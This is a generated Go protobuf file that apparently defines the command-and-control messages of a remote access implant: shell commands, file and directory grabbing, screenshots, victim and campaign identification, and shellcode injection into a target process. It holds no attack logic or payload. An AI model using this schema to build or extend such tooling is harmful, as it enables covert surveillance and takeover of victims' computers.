// Code generated by protoc-gen-go. DO NOT EDIT.
// versions:
// 	protoc-gen-go v1.28.0
// 	protoc        v3.20.1
// source: migrator.proto

package main

import (
	protoreflect "google.golang.org/protobuf/reflect/protoreflect"
	protoimpl "google.golang.org/protobuf/runtime/protoimpl"
	reflect "reflect"
	sync "sync"
)

const (
	// Verify that this generated code is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(20 - protoimpl.MinVersion)
	// Verify that runtime/protoimpl is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(protoimpl.MaxVersion - 20)
)

type ShellCommand struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Command string `protobuf:"bytes,1,opt,name=command,proto3" json:"command,omitempty"`
}

func (x *ShellCommand) Reset() {
	*x = ShellCommand{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[0]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *ShellCommand) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*ShellCommand) ProtoMessage() {}

func (x *ShellCommand) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[0]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use ShellCommand.ProtoReflect.Descriptor instead.
func (*ShellCommand) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{0}
}

func (x *ShellCommand) GetCommand() string {
	if x != nil {
		return x.Command
	}
	return ""
}

type ShellResponse struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Output string `protobuf:"bytes,1,opt,name=output,proto3" json:"output,omitempty"`
}

func (x *ShellResponse) Reset() {
	*x = ShellResponse{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[1]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *ShellResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*ShellResponse) ProtoMessage() {}

func (x *ShellResponse) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[1]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use ShellResponse.ProtoReflect.Descriptor instead.
func (*ShellResponse) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{1}
}

func (x *ShellResponse) GetOutput() string {
	if x != nil {
		return x.Output
	}
	return ""
}

type GetFile struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Path string `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
}

func (x *GetFile) Reset() {
	*x = GetFile{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[2]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *GetFile) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*GetFile) ProtoMessage() {}

func (x *GetFile) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[2]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use GetFile.ProtoReflect.Descriptor instead.
func (*GetFile) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{2}
}

func (x *GetFile) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

type File struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Path string `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	Data []byte `protobuf:"bytes,2,opt,name=data,proto3" json:"data,omitempty"`
}

func (x *File) Reset() {
	*x = File{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[3]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *File) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*File) ProtoMessage() {}

func (x *File) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[3]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use File.ProtoReflect.Descriptor instead.
func (*File) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{3}
}

func (x *File) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

func (x *File) GetData() []byte {
	if x != nil {
		return x.Data
	}
	return nil
}

type HeartbeatResponse struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	KeepOpen bool `protobuf:"varint,1,opt,name=keep_open,json=keepOpen,proto3" json:"keep_open,omitempty"`
}

func (x *HeartbeatResponse) Reset() {
	*x = HeartbeatResponse{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[4]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *HeartbeatResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*HeartbeatResponse) ProtoMessage() {}

func (x *HeartbeatResponse) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[4]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use HeartbeatResponse.ProtoReflect.Descriptor instead.
func (*HeartbeatResponse) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{4}
}

func (x *HeartbeatResponse) GetKeepOpen() bool {
	if x != nil {
		return x.KeepOpen
	}
	return false
}

type Ident struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Id           string `protobuf:"bytes,1,opt,name=id,proto3" json:"id,omitempty"`
	CampainId    string `protobuf:"bytes,2,opt,name=campainId,proto3" json:"campainId,omitempty"`
	ComputerName string `protobuf:"bytes,3,opt,name=computerName,proto3" json:"computerName,omitempty"`
	Processname  string `protobuf:"bytes,4,opt,name=processname,proto3" json:"processname,omitempty"`
	Username     string `protobuf:"bytes,5,opt,name=username,proto3" json:"username,omitempty"`
}

func (x *Ident) Reset() {
	*x = Ident{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[5]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *Ident) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*Ident) ProtoMessage() {}

func (x *Ident) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[5]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use Ident.ProtoReflect.Descriptor instead.
func (*Ident) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{5}
}

func (x *Ident) GetId() string {
	if x != nil {
		return x.Id
	}
	return ""
}

func (x *Ident) GetCampainId() string {
	if x != nil {
		return x.CampainId
	}
	return ""
}

func (x *Ident) GetComputerName() string {
	if x != nil {
		return x.ComputerName
	}
	return ""
}

func (x *Ident) GetProcessname() string {
	if x != nil {
		return x.Processname
	}
	return ""
}

func (x *Ident) GetUsername() string {
	if x != nil {
		return x.Username
	}
	return ""
}

type TakeScreenshot struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Screen int32 `protobuf:"varint,1,opt,name=screen,proto3" json:"screen,omitempty"`
}

func (x *TakeScreenshot) Reset() {
	*x = TakeScreenshot{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[6]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *TakeScreenshot) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*TakeScreenshot) ProtoMessage() {}

func (x *TakeScreenshot) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[6]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use TakeScreenshot.ProtoReflect.Descriptor instead.
func (*TakeScreenshot) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{6}
}

func (x *TakeScreenshot) GetScreen() int32 {
	if x != nil {
		return x.Screen
	}
	return 0
}

type Screenshot struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Time string `protobuf:"bytes,1,opt,name=time,proto3" json:"time,omitempty"`
	Data []byte `protobuf:"bytes,2,opt,name=data,proto3" json:"data,omitempty"`
}

func (x *Screenshot) Reset() {
	*x = Screenshot{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[7]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *Screenshot) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*Screenshot) ProtoMessage() {}

func (x *Screenshot) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[7]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use Screenshot.ProtoReflect.Descriptor instead.
func (*Screenshot) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{7}
}

func (x *Screenshot) GetTime() string {
	if x != nil {
		return x.Time
	}
	return ""
}

func (x *Screenshot) GetData() []byte {
	if x != nil {
		return x.Data
	}
	return nil
}

type GetDirectory struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Path string `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
}

func (x *GetDirectory) Reset() {
	*x = GetDirectory{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[8]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *GetDirectory) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*GetDirectory) ProtoMessage() {}

func (x *GetDirectory) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[8]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use GetDirectory.ProtoReflect.Descriptor instead.
func (*GetDirectory) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{8}
}

func (x *GetDirectory) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

type FileInfo struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Name      string `protobuf:"bytes,1,opt,name=name,proto3" json:"name,omitempty"`
	Size      int64  `protobuf:"varint,2,opt,name=size,proto3" json:"size,omitempty"`
	Directory bool   `protobuf:"varint,3,opt,name=directory,proto3" json:"directory,omitempty"`
	Owner     string `protobuf:"bytes,4,opt,name=owner,proto3" json:"owner,omitempty"`
}

func (x *FileInfo) Reset() {
	*x = FileInfo{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[9]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *FileInfo) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*FileInfo) ProtoMessage() {}

func (x *FileInfo) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[9]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use FileInfo.ProtoReflect.Descriptor instead.
func (*FileInfo) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{9}
}

func (x *FileInfo) GetName() string {
	if x != nil {
		return x.Name
	}
	return ""
}

func (x *FileInfo) GetSize() int64 {
	if x != nil {
		return x.Size
	}
	return 0
}

func (x *FileInfo) GetDirectory() bool {
	if x != nil {
		return x.Directory
	}
	return false
}

func (x *FileInfo) GetOwner() string {
	if x != nil {
		return x.Owner
	}
	return ""
}

type GetDirectoryResponse struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Basepath string      `protobuf:"bytes,1,opt,name=basepath,proto3" json:"basepath,omitempty"`
	Files    []*FileInfo `protobuf:"bytes,2,rep,name=files,proto3" json:"files,omitempty"`
}

func (x *GetDirectoryResponse) Reset() {
	*x = GetDirectoryResponse{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[10]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *GetDirectoryResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*GetDirectoryResponse) ProtoMessage() {}

func (x *GetDirectoryResponse) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[10]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use GetDirectoryResponse.ProtoReflect.Descriptor instead.
func (*GetDirectoryResponse) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{10}
}

func (x *GetDirectoryResponse) GetBasepath() string {
	if x != nil {
		return x.Basepath
	}
	return ""
}

func (x *GetDirectoryResponse) GetFiles() []*FileInfo {
	if x != nil {
		return x.Files
	}
	return nil
}

type Interpret struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Type int32  `protobuf:"varint,1,opt,name=type,proto3" json:"type,omitempty"`
	Data string `protobuf:"bytes,2,opt,name=data,proto3" json:"data,omitempty"`
}

func (x *Interpret) Reset() {
	*x = Interpret{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[11]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *Interpret) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*Interpret) ProtoMessage() {}

func (x *Interpret) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[11]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use Interpret.ProtoReflect.Descriptor instead.
func (*Interpret) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{11}
}

func (x *Interpret) GetType() int32 {
	if x != nil {
		return x.Type
	}
	return 0
}

func (x *Interpret) GetData() string {
	if x != nil {
		return x.Data
	}
	return ""
}

type InterpretResponse struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Type int32  `protobuf:"varint,1,opt,name=type,proto3" json:"type,omitempty"`
	Data string `protobuf:"bytes,2,opt,name=data,proto3" json:"data,omitempty"`
}

func (x *InterpretResponse) Reset() {
	*x = InterpretResponse{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[12]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *InterpretResponse) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*InterpretResponse) ProtoMessage() {}

func (x *InterpretResponse) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[12]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use InterpretResponse.ProtoReflect.Descriptor instead.
func (*InterpretResponse) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{12}
}

func (x *InterpretResponse) GetType() int32 {
	if x != nil {
		return x.Type
	}
	return 0
}

func (x *InterpretResponse) GetData() string {
	if x != nil {
		return x.Data
	}
	return ""
}

type InjectShellcode struct {
	state         protoimpl.MessageState
	sizeCache     protoimpl.SizeCache
	unknownFields protoimpl.UnknownFields

	Target    string `protobuf:"bytes,1,opt,name=target,proto3" json:"target,omitempty"`
	Shellcode []byte `protobuf:"bytes,2,opt,name=shellcode,proto3" json:"shellcode,omitempty"`
}

func (x *InjectShellcode) Reset() {
	*x = InjectShellcode{}
	if protoimpl.UnsafeEnabled {
		mi := &file_migrator_proto_msgTypes[13]
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		ms.StoreMessageInfo(mi)
	}
}

func (x *InjectShellcode) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*InjectShellcode) ProtoMessage() {}

func (x *InjectShellcode) ProtoReflect() protoreflect.Message {
	mi := &file_migrator_proto_msgTypes[13]
	if protoimpl.UnsafeEnabled && x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use InjectShellcode.ProtoReflect.Descriptor instead.
func (*InjectShellcode) Descriptor() ([]byte, []int) {
	return file_migrator_proto_rawDescGZIP(), []int{13}
}

func (x *InjectShellcode) GetTarget() string {
	if x != nil {
		return x.Target
	}
	return ""
}

func (x *InjectShellcode) GetShellcode() []byte {
	if x != nil {
		return x.Shellcode
	}
	return nil
}

var File_migrator_proto protoreflect.FileDescriptor

var file_migrator_proto_rawDesc = []byte{
	0x0a, 0x0e, 0x6d, 0x69, 0x67, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f,
	0x12, 0x06, 0x6d, 0x69, 0x67, 0x72, 0x61, 0x74, 0x22, 0x28, 0x0a, 0x0c, 0x53, 0x68, 0x65, 0x6c,
	0x6c, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x12, 0x18, 0x0a, 0x07, 0x63, 0x6f, 0x6d, 0x6d,
	0x61, 0x6e, 0x64, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x07, 0x63, 0x6f, 0x6d, 0x6d, 0x61,
	0x6e, 0x64, 0x22, 0x27, 0x0a, 0x0d, 0x53, 0x68, 0x65, 0x6c, 0x6c, 0x52, 0x65, 0x73, 0x70, 0x6f,
	0x6e, 0x73, 0x65, 0x12, 0x16, 0x0a, 0x06, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x18, 0x01, 0x20,
	0x01, 0x28, 0x09, 0x52, 0x06, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x22, 0x1d, 0x0a, 0x07, 0x47,
	0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x12, 0x12, 0x0a, 0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x70, 0x61, 0x74, 0x68, 0x22, 0x2e, 0x0a, 0x04, 0x46, 0x69,
	0x6c, 0x65, 0x12, 0x12, 0x0a, 0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09,
	0x52, 0x04, 0x70, 0x61, 0x74, 0x68, 0x12, 0x12, 0x0a, 0x04, 0x64, 0x61, 0x74, 0x61, 0x18, 0x02,
	0x20, 0x01, 0x28, 0x0c, 0x52, 0x04, 0x64, 0x61, 0x74, 0x61, 0x22, 0x30, 0x0a, 0x11, 0x48, 0x65,
	0x61, 0x72, 0x74, 0x62, 0x65, 0x61, 0x74, 0x52, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65, 0x12,
	0x1b, 0x0a, 0x09, 0x6b, 0x65, 0x65, 0x70, 0x5f, 0x6f, 0x70, 0x65, 0x6e, 0x18, 0x01, 0x20, 0x01,
	0x28, 0x08, 0x52, 0x08, 0x6b, 0x65, 0x65, 0x70, 0x4f, 0x70, 0x65, 0x6e, 0x22, 0x97, 0x01, 0x0a,
	0x05, 0x49, 0x64, 0x65, 0x6e, 0x74, 0x12, 0x0e, 0x0a, 0x02, 0x69, 0x64, 0x18, 0x01, 0x20, 0x01,
	0x28, 0x09, 0x52, 0x02, 0x69, 0x64, 0x12, 0x1c, 0x0a, 0x09, 0x63, 0x61, 0x6d, 0x70, 0x61, 0x69,
	0x6e, 0x49, 0x64, 0x18, 0x02, 0x20, 0x01, 0x28, 0x09, 0x52, 0x09, 0x63, 0x61, 0x6d, 0x70, 0x61,
	0x69, 0x6e, 0x49, 0x64, 0x12, 0x22, 0x0a, 0x0c, 0x63, 0x6f, 0x6d, 0x70, 0x75, 0x74, 0x65, 0x72,
	0x4e, 0x61, 0x6d, 0x65, 0x18, 0x03, 0x20, 0x01, 0x28, 0x09, 0x52, 0x0c, 0x63, 0x6f, 0x6d, 0x70,
	0x75, 0x74, 0x65, 0x72, 0x4e, 0x61, 0x6d, 0x65, 0x12, 0x20, 0x0a, 0x0b, 0x70, 0x72, 0x6f, 0x63,
	0x65, 0x73, 0x73, 0x6e, 0x61, 0x6d, 0x65, 0x18, 0x04, 0x20, 0x01, 0x28, 0x09, 0x52, 0x0b, 0x70,
	0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x6e, 0x61, 0x6d, 0x65, 0x12, 0x1a, 0x0a, 0x08, 0x75, 0x73,
	0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x18, 0x05, 0x20, 0x01, 0x28, 0x09, 0x52, 0x08, 0x75, 0x73,
	0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x22, 0x28, 0x0a, 0x0e, 0x54, 0x61, 0x6b, 0x65, 0x53, 0x63,
	0x72, 0x65, 0x65, 0x6e, 0x73, 0x68, 0x6f, 0x74, 0x12, 0x16, 0x0a, 0x06, 0x73, 0x63, 0x72, 0x65,
	0x65, 0x6e, 0x18, 0x01, 0x20, 0x01, 0x28, 0x05, 0x52, 0x06, 0x73, 0x63, 0x72, 0x65, 0x65, 0x6e,
	0x22, 0x34, 0x0a, 0x0a, 0x53, 0x63, 0x72, 0x65, 0x65, 0x6e, 0x73, 0x68, 0x6f, 0x74, 0x12, 0x12,
	0x0a, 0x04, 0x74, 0x69, 0x6d, 0x65, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x74, 0x69,
	0x6d, 0x65, 0x12, 0x12, 0x0a, 0x04, 0x64, 0x61, 0x74, 0x61, 0x18, 0x02, 0x20, 0x01, 0x28, 0x0c,
	0x52, 0x04, 0x64, 0x61, 0x74, 0x61, 0x22, 0x22, 0x0a, 0x0c, 0x47, 0x65, 0x74, 0x44, 0x69, 0x72,
	0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x12, 0x12, 0x0a, 0x04, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x70, 0x61, 0x74, 0x68, 0x22, 0x66, 0x0a, 0x08, 0x46, 0x69,
	0x6c, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0x12, 0x12, 0x0a, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x18, 0x01,
	0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x12, 0x12, 0x0a, 0x04, 0x73, 0x69,
	0x7a, 0x65, 0x18, 0x02, 0x20, 0x01, 0x28, 0x03, 0x52, 0x04, 0x73, 0x69, 0x7a, 0x65, 0x12, 0x1c,
	0x0a, 0x09, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x18, 0x03, 0x20, 0x01, 0x28,
	0x08, 0x52, 0x09, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x12, 0x14, 0x0a, 0x05,
	0x6f, 0x77, 0x6e, 0x65, 0x72, 0x18, 0x04, 0x20, 0x01, 0x28, 0x09, 0x52, 0x05, 0x6f, 0x77, 0x6e,
	0x65, 0x72, 0x22, 0x5a, 0x0a, 0x14, 0x47, 0x65, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f,
	0x72, 0x79, 0x52, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65, 0x12, 0x1a, 0x0a, 0x08, 0x62, 0x61,
	0x73, 0x65, 0x70, 0x61, 0x74, 0x68, 0x18, 0x01, 0x20, 0x01, 0x28, 0x09, 0x52, 0x08, 0x62, 0x61,
	0x73, 0x65, 0x70, 0x61, 0x74, 0x68, 0x12, 0x26, 0x0a, 0x05, 0x66, 0x69, 0x6c, 0x65, 0x73, 0x18,
	0x02, 0x20, 0x03, 0x28, 0x0b, 0x32, 0x10, 0x2e, 0x6d, 0x69, 0x67, 0x72, 0x61, 0x74, 0x2e, 0x46,
	0x69, 0x6c, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0x52, 0x05, 0x66, 0x69, 0x6c, 0x65, 0x73, 0x22, 0x33,
	0x0a, 0x09, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x70, 0x72, 0x65, 0x74, 0x12, 0x12, 0x0a, 0x04, 0x74,
	0x79, 0x70, 0x65, 0x18, 0x01, 0x20, 0x01, 0x28, 0x05, 0x52, 0x04, 0x74, 0x79, 0x70, 0x65, 0x12,
	0x12, 0x0a, 0x04, 0x64, 0x61, 0x74, 0x61, 0x18, 0x02, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x64,
	0x61, 0x74, 0x61, 0x22, 0x3b, 0x0a, 0x11, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x70, 0x72, 0x65, 0x74,
	0x52, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65, 0x12, 0x12, 0x0a, 0x04, 0x74, 0x79, 0x70, 0x65,
	0x18, 0x01, 0x20, 0x01, 0x28, 0x05, 0x52, 0x04, 0x74, 0x79, 0x70, 0x65, 0x12, 0x12, 0x0a, 0x04,
	0x64, 0x61, 0x74, 0x61, 0x18, 0x02, 0x20, 0x01, 0x28, 0x09, 0x52, 0x04, 0x64, 0x61, 0x74, 0x61,
	0x22, 0x47, 0x0a, 0x0f, 0x49, 0x6e, 0x6a, 0x65, 0x63, 0x74, 0x53, 0x68, 0x65, 0x6c, 0x6c, 0x63,
	0x6f, 0x64, 0x65, 0x12, 0x16, 0x0a, 0x06, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x18, 0x01, 0x20,
	0x01, 0x28, 0x09, 0x52, 0x06, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x12, 0x1c, 0x0a, 0x09, 0x73,
	0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x65, 0x18, 0x02, 0x20, 0x01, 0x28, 0x0c, 0x52, 0x09,
	0x73, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x65, 0x42, 0x03, 0x5a, 0x01, 0x2e, 0x62, 0x06,
	0x70, 0x72, 0x6f, 0x74, 0x6f, 0x33,
}

var (
	file_migrator_proto_rawDescOnce sync.Once
	file_migrator_proto_rawDescData = file_migrator_proto_rawDesc
)

func file_migrator_proto_rawDescGZIP() []byte {
	file_migrator_proto_rawDescOnce.Do(func() {
		file_migrator_proto_rawDescData = protoimpl.X.CompressGZIP(file_migrator_proto_rawDescData)
	})
	return file_migrator_proto_rawDescData
}

var file_migrator_proto_msgTypes = make([]protoimpl.MessageInfo, 14)
